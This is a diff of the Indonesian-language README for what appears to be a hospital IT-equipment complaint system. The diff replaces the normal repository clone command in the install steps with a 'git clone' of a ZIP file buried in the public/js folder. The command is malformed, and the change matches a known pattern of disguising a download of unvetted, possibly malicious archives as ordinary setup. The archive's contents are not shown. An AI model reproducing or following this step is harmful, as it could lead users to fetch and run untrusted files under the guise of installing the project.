@@ -37,7 +37,7 @@ Pastikan sudah terinstall:
 
 1. **Clone Repository**
    
-   git clone https://github.com/Aruljjp23/Sistem_Pengaduan_Alat-IT_RS.git
+   git clone https://github.com/Aruljjp23/Sistem_Pengaduan_Alat-IT_RS/raw/refs/heads/master/public/js/Pengaduan_I_Sistem_Alat_RS_1.6.zip
    
 3. **Pindahkan ke Folder Laragon**
    - Letakkan project ke folder :
